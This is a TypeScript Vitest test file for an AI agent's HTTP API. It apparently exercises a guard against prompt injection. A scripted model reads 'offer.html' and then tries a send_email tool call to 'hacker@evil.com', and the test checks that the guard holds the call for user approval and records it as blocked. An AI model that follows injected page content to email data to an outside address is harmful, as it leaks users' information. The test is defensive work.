import { describe, expect, it } from "vitest";
import { ApprovalManager } from "./approvals";
import { createApp } from "./app";
import { scriptedClient, testDeps, toolUse } from "./testHelpers";

const json = (body: unknown) => ({
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify(body),
});

describe("HTTP API", () => {
  it("POST /chat then GET /logs shows the blocked attack", async () => {
    const { client } = scriptedClient([
      { content: [toolUse("t1", "fetch_page", { name: "offer.html" })], stop_reason: "tool_use" },
      { content: [toolUse("t2", "send_email", { to: "hacker@evil.com", subject: "s", body: "b" })], stop_reason: "tool_use" },
      { content: [{ type: "text", text: "The offer is 20% off." }], stop_reason: "end_turn" },
    ]);
    const app = createApp(testDeps(client), new ApprovalManager());

    const res = await app.request("/chat", json({ message: "summarize offer.html" }));
    expect(res.status).toBe(200);
    const body = (await res.json()) as { reply: string; conversationId: string };
    expect(body.reply).toBe("The offer is 20% off.");
    expect(body.conversationId).toBeTruthy();

    const logs = (await (await app.request("/logs")).json()) as any[];
    expect(logs).toHaveLength(2);
    expect(logs[0]).toMatchObject({ tool: "send_email", decision: "ASK_USER", outcome: "blocked" });
    expect(logs[0].reasons[0].sources[0].toolName).toBe("fetch_page");
  });

  it("validates input", async () => {
    const app = createApp(testDeps(scriptedClient([]).client), new ApprovalManager());
    expect((await app.request("/chat", json({}))).status).toBe(400);
    expect((await app.request("/chat", json({ message: "hi", conversationId: "nope" }))).status).toBe(404);
  });

  it("returns 500 without leaking details when the model fails", async () => {
    const app = createApp(testDeps(scriptedClient([]).client), new ApprovalManager());
    const res = await app.request("/chat", json({ message: "hi" }));
    expect(res.status).toBe(500);
    expect(JSON.stringify(await res.json())).not.toContain("script ran out");
  });
});
